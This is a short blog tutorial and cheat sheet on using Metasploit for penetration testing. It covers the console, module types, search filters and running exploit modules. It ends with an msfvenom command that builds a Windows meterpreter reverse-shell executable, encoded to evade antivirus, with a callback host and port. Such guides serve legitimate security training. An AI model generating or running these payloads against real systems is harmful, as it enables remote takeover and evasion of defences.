---
title: Pentesting with Metasploit the Vulnerability Exploitation Tool (with Cheat Sheets)
date: 2021-09-26
tags: [security, kali]
image: msf.png
---

Metasploit is the ultimate penetration testing tool for offensive security. And it's so easy to use that even you could claim to be a hacker just by running a few commands. Also, it is incredibly powerful as well. This guide is a general overview of how Metasploit can be used.

## 1. Getting started

Start the Metasploit console.

```bash
# Start the console
$ msfconsole
```

The console will now show the msf shell. You can provide commands on the shell to run various Metasploit modules.

Metasploit continuously adds new modules to its collection. To make sure you always have the latest exploits, run:

```bash
msf > msfupdate     # Update the msf database
```

Metasploit is quite big and it's easy to get lost around. If you need help, run:

```bash
msf > help          # Show help
```

The console output of the _help_ command might feel overwhelming as well. But don't worry. You'll always have this blog post to help you out.

## 2. Metasploit Modules

Metasploit has thousands of modules. They are arranged in the following categories:

* **Exploits**: It is the most commonly used module. It sends payloads to targets and executes them.
* **Payloads**: It consists of code that runs remotely to exploit the target.
* **Encoders**: It encodes a payload so that it is not detected by firewalls/anti-malware programs.
* **Nops**: It keeps payload sizes consistent when encoders encode a payload. (Learn more about nop sled).
* **Post**: It contains modules that assist post-exploitation.
* **Auxillary**: It includes port scanners, fuzzers, sniffers, and other helper modules.

You can see the modules under each of these categories. Check what exists by running:

```bash
$ show exploits
$ show payloads
```

## 3. Searching for Modules

If you've tried ```show exploits``` you've probably seen a huge list of modules. It's impossible to go through this list and find what you need. You can use the **search** functionality to filter/look for your desired modules. Run:

```bash
$ search ftp
```

This will show you modules that have exploits for FTP servers. You can filter based on more criteria:

```bash
$ search ftp platform:windows rank:excellent
```

This will show excellently ranked FTP server exploits for windows machines. You can filter based on the following fields:

* name
* path
* platform
* type
* app
* author
* cve
* bid
* osdvb

## 4. Run an Exploit

The following series of shell commands are typically used to run an exploit using Metasploit.

At first select the module of your choice that you want to run for exploitation.

```bash
msf > use exploit/[ExploitModule]
```

Modules have multiple options that need to be set for execution. To see what options can be set, see the options:

```bash
msf > show options
```

After seeing the options, set their values like:

```bash
msf > set [Option] [Value]
msf > RHOST 10.100.101.12       # example
msf > set RPORT 8000            # example
```

Now start the exploit:

```bash
msf > exploit
```

## 5. Make Payloads with Msfvenom

Sometimes you'll need to create standalone files as payloads to send them to your target. Msfvenom is a CLI tool that can help with creating these files.

At first search for payloads and encoders that msfvenom has. Payloads execute an attack and encoders encode a payload so that the payload can evade AVs.

```bash
$ msfvenom -l           # Payloads
$ msfvenom -l encoders  # Encoders
```

A typical msfvenom that generates payloads looks like this.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp
           -f exe 
           -e x86/shikata_ga_nai -i 5 
           LHOST=10.1.1.1
           LPORT=4444 > met.exe
```

Other output formats such as pl, rb, py can also be specified.

